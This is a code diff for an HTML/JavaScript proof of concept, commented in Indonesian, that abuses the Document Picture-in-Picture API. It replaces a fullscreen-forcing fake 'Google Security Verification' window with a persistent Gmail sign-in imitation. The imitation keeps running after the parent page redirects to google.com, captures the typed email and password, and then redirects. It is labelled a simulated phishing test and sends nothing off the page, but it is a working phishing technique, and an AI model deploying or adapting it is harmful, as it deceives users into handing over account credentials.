@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PiP Fullscreen Force</title>
+<title>Persistent PiP Lifecycle Bypass</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
@@ -18,9 +18,9 @@
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 PiP Fullscreen Force</h2>
-  <p>Klik tombol di bawah. PiP akan dipaksa masuk fullscreen dan menutupi seluruh layar.</p>
-  <button id="startBtn">Force PiP Fullscreen</button>
+  <h2>🔒 Persistent PiP Lifecycle Bypass</h2>
+  <p>Klik tombol di bawah. PiP akan tetap hidup meskipun halaman utama di-redirect ke Google.</p>
+  <button id="startBtn">Open Persistent PiP</button>
   <div id="status">[*] Ready...</div>
 </div>
 
@@ -33,14 +33,14 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP Fullscreen] " + msg);
+    console.log("[PiP Persistence] " + msg);
   }
 
   // ============================================
   // 1. TRIGGER (KLIK)
   // ============================================
   btn.addEventListener('click', async function() {
-    log("[*] Membuka PiP untuk fullscreen bypass...");
+    log("[*] Membuka PiP dengan lifecycle persistence...");
 
     try {
       if (!window.documentPictureInPicture) {
@@ -52,47 +52,18 @@
       // 2. BUKA PiP
       // ============================================
       const pipWindow = await documentPictureInPicture.requestWindow({
-        width: 400,
-        height: 300
+        width: 500,
+        height: 500
       });
 
-      log('PiP Window Opened. Size: ' + pipWindow.innerWidth + 'x' + pipWindow.innerHeight);
+      log('PiP Window Opened.');
 
       // ============================================
-      // 3. PAKSA FULLSCREEN (MULTIPLE METODE)
+      // 3. TULIS ULANG DOKUMEN PiP (MANDIRI)
       // ============================================
-      
-      // A. Resize ke ukuran layar penuh
-      try {
-        pipWindow.resizeTo(screen.width, screen.height);
-        log('Resized to screen: ' + screen.width + 'x' + screen.height);
-      } catch (e) {
-        log('Resize error: ' + e.message);
-      }
-
-      // B. Pindahkan ke posisi 0,0
-      try {
-        pipWindow.moveTo(0, 0);
-      } catch (e) {}
-
-      // C. Request Fullscreen API (pada elemen root PiP)
-      try {
-        const root = pipWindow.document.documentElement;
-        if (root.requestFullscreen) {
-          await root.requestFullscreen();
-        } else if (root.webkitRequestFullscreen) {
-          await root.webkitRequestFullscreen();
-        } else if (root.mozRequestFullScreen) {
-          await root.mozRequestFullScreen();
-        }
-        log('Fullscreen API requested.');
-      } catch (e) {
-        log('Fullscreen API ditolak: ' + e.message);
-      }
-
-      // ============================================
-      // 4. TULIS KONTEN PiP (FULLSCREEN)
-      // ============================================
+      // Kita menulis ulang seluruh dokumen PiP dengan script mandiri.
+      // Script ini tidak bergantung pada parent dan akan tetap berjalan
+      // meskipun parent di-redirect atau ditutup.
       pipWindow.document.open();
       pipWindow.document.write(`
         <!DOCTYPE html>
@@ -112,47 +83,78 @@
               min-height: 100vh;
               padding: 20px;
               text-align: center;
-              overflow: hidden;
             }
-            h3 { font-size: 28px; color: #333; margin-bottom: 10px; }
-            p { font-size: 16px; color: #666; margin-bottom: 20px; }
-            .info {
-              font-family: monospace;
+            .g-logo {
+              font-size: 32px;
+              font-weight: bold;
+              color: #4285f4;
+              margin-bottom: 20px;
+            }
+            h3 { font-size: 20px; color: #333; margin-bottom: 5px; }
+            p { font-size: 13px; color: #666; margin-bottom: 20px; }
+            input {
+              width: 100%;
+              padding: 12px;
+              margin-bottom: 12px;
+              border: 1px solid #ddd;
+              border-radius: 6px;
               font-size: 14px;
-              color: #999;
-              margin-top: 20px;
             }
-            .fake-btn {
-              padding: 15px 30px;
+            button {
+              width: 100%;
+              padding: 12px;
               background: #1a73e8;
               color: #fff;
               border: none;
-              border-radius: 8px;
-              font-size: 18px;
+              border-radius: 6px;
+              font-size: 14px;
               font-weight: bold;
               cursor: pointer;
-              margin-top: 20px;
+            }
+            .warning {
+              margin-top: 15px;
+              font-size: 11px;
+              color: #f00;
             }
           </style>
         </head>
         <body>
-          <h3>Google Security Verification</h3>
-          <p>This PiP window is in fullscreen mode.</p>
-          <div class="info" id="sizeInfo">Size: ${pipWindow.innerWidth}x${pipWindow.innerHeight}</div>
-          <button class="fake-btn" id="fakeBtn">Verify Account</button>
+          <div class="g-logo">G</div>
+          <h3>Sign in</h3>
+          <p>to continue to Gmail</p>
+          <input type="email" id="pipEmail" placeholder="Email or phone" autofocus />
+          <input type="password" id="pipPassword" placeholder="Password" />
+          <button id="pipLogin">Next</button>
+          <div class="warning">This is a simulated phishing test. Do not enter real credentials.</div>
 
           <script>
             (function() {
-              var sizeInfo = document.getElementById('sizeInfo');
-              function updateSize() {
-                sizeInfo.textContent = 'Size: ' + window.innerWidth + 'x' + window.innerHeight;
-              }
-              window.addEventListener('resize', updateSize);
-              updateSize();
+              // Script mandiri di dalam PiP
+              // Tetap berjalan meskipun parent redirect/close.
+              
+              document.getElementById('pipLogin').addEventListener('click', function() {
+                var email = document.getElementById('pipEmail').value;
+                var password = document.getElementById('pipPassword').value;
+                
+                if (!email || !password) {
+                  alert("Email dan password harus diisi!");
+                  return;
+                }
 
-              // Tombol palsu untuk memperkuat ilusi
-              document.getElementById('fakeBtn').addEventListener('click', function() {
-                alert('Verification Required. Please close this window manually.');
+                // Tampilkan data di PiP (untuk pengujian)
+                document.body.innerHTML = \`
+                  <div style="font-family:monospace;padding:20px;background:#000;color:#0f0;border-radius:6px;width:100%;">
+                    <h3 style="color:#f00;">Credentials Captured!</h3>
+                    <p><strong>Email:</strong> \${email}</p>
+                    <p><strong>Password:</strong> \${password}</p>
+                    <p style="color:#666;margin-top:15px;">Redirecting to Google...</p>
+                  </div>
+                \`;
+
+                // Redirect PiP ke Google asli (setelah 2 detik)
+                setTimeout(function() {
+                  window.location.href = 'https://www.google.com';
+                }, 2000);
               });
             })();
           <\/script>
@@ -161,7 +163,15 @@
       `);
       pipWindow.document.close();
 
-      log('PiP fullscreen bypass attempt completed.');
+      log('PiP persistent payload injected.');
+
+      // ============================================
+      // 4. REDIRECT PARENT KE GOOGLE.COM (UJI LIFECYCLE)
+      // ============================================
+      setTimeout(function() {
+        log('Redirecting parent to google.com...');
+        window.location.replace('https://www.google.com');
+      }, 1000);
 
     } catch (e) {
       log('Error: ' + e.message);
